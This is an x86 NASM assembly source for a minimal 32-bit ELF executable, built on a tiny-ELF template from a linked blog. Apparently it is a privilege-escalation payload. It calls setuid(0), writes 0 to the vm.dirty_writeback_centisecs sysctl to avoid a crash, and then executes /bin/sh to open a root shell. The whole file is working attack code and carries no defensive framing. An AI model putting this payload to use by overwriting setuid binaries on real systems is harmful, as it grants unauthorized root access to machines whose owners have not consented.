; https://blog.stalkr.net/2014/10/tiny-elf-3264-with-nasm.html
BITS 32
	org     0x08048000
ehdr:                                           ;   Elf32_Ehdr
	db      0x7F, "ELF", 1, 1, 1, 0         ;   e_ident
	times 8 db      0
	dw      2                               ;   e_type
	dw      3                               ;   e_machine
	dd      1                               ;   e_version
	dd      _start                          ;   e_entry
	dd      phdr - $$                       ;   e_phoff
	dd      0                               ;   e_shoff
	dd      0                               ;   e_flags
	dw      ehdrsize                        ;   e_ehsize
	dw      phdrsize                        ;   e_phentsize
	dw      1                               ;   e_phnum
	dw      0                               ;   e_shentsize
	dw      0                               ;   e_shnum
	dw      0                               ;   e_shstrndx
	ehdrsize      equ     $ - ehdr
 
phdr:                                           ;   Elf32_Phdr
	dd      1                               ;   p_type
	dd      0                               ;   p_offset
	dd      $$                              ;   p_vaddr
	dd      $$                              ;   p_paddr
	dd      filesize                        ;   p_filesz
	dd      filesize                        ;   p_memsz
	dd      5                               ;   p_flags
	dd      0x1000                          ;   p_align
	phdrsize      equ     $ - phdr


sysctl_file: db "/proc/sys/vm/dirty_writeback_centisecs",0
sysctl_value: db "0",0
sh_path: db "/bin/sh",0

_start: 
	; need to elevate permissions first
	xor ebx, ebx            ; uid=0
	mov eax, 0xD5           ; sys_setuid
	int 0x80				; syscall

	; next, gotta change vm.dirty_writeback_centisecs to 0 to
	; prevent crash
	mov eax, 0x5            ; open()
	mov ebx, sysctl_file    ; filename
	mov ecx, 0x1            ; O_WRONLY
	int 0x80

	mov ebx, eax            ; stash the fd in rbx

	mov eax, 0x4         	; 'write' syscall
					        ; file descriptor already in ebx
	mov ecx, sysctl_value	; message address
	mov edx, 0x1         	; message string length
	int 0x80

	mov eax, 0x6            ; 'close' syscall
					        ; file descriptor alerady in ebx
	int 0x80 

	; now we should be able to safely pop the shell 
	mov eax, 0xb 			; execve syscall
	mov ebx, sh_path
	mov ecx, 0
	mov edx, 0
	int 0x80

filesize      equ     $ - $$